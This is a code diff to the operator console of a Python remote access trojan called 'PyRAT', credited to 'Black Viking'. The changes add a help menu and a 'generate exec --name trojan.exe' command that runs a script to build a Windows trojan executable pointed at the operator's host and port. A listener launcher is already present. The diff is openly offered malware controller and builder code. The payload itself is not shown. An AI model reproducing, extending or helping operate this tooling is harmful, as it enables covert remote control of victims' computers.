@@ -47,10 +47,10 @@ $$ |      \$$$$$$$ |$$ |  $$ |$$ |  $$ |  $$ |
 \t[>]--->       %sBlack Viking%s       <---[<]
 """%(Style.BRIGHT, red, Style.BRIGHT, Style.NORMAL, Style.BRIGHT, Style.NORMAL)
     print logo
-    server_help()
+    help()
     print bright + white + "="*80
 
-def server_help():
+def help():
     print bright + yellow + """
 Commands:
     set HOST           : Set HOST value.
@@ -61,12 +61,21 @@ Commands:
 Example:
     >>> PyRAT ==> set HOST 127.0.0.1
     >>> PyRAT ==> set PORT 8000
-    >>> PyRAT ==> settings
+    >>> PyRAT ==> show listener
 [~] HOST: 127.0.0.1
 [~] PORT: 8000
 ===========================================================
     >>> PyRAT ==> start listener / start / run
-"""
+
+#---- Generating exe files(Windows)
+    
+    >>> PyRAT ==> set HOST 127.0.0.1
+    >>> PyRAT ==> set PORT 8000
+    >>> PyRAT ==> show listener
+[~] HOST: 127.0.0.1
+[~] PORT: 8000
+===========================================================
+    >>> PyRAT ==> generate exec --name trojan.exe"""
     
 
 #-----------------   Main Function   -----------------#
@@ -76,11 +85,15 @@ def main():
 
     while True:
         pyrat = raw_input(bright+red+"PyRAT %s==%s> "%(Style.NORMAL, bright)).lower()
-        if "set host" in pyrat:
-            host = pyrat.replace("set host ", "")
+
+        if pyrat == "help":
+            help()
+
+        elif "set host" in pyrat:
+            host = pyrat.split()[-1]
 
         elif "set port" in pyrat:
-            port = int(pyrat.replace("set port ", ""))
+            port = int(pyrat.split()[-1])
 
         elif pyrat == "show listener":
             print "[~] Host: %s\n[~] Port: %s\n"%(host, port)+"="*60
@@ -90,6 +103,17 @@ def main():
                 Popen([sys.executable, 'source/listener.py', host, str(port)], creationflags=CREATE_NEW_CONSOLE)
             else:
                 print "[~] Host: %s\n[~] Port: %s\n"%(host, port)+"="*60
+
+        elif "generate exec --name" in pyrat:
+            if host != " " and port != " ":
+                name = pyrat.split()[-1]
+                if name != "":
+                    Popen([sys.executable, 'source/generate_exec.py', host, str(port), name], creationflags=CREATE_NEW_CONSOLE)
+                else:
+                    pass
+            else:
+                print "[~] Host: %s\n[~] Port: %s\n"%(host, port)+"="*60
+
 
 
 if __name__ == "__main__":
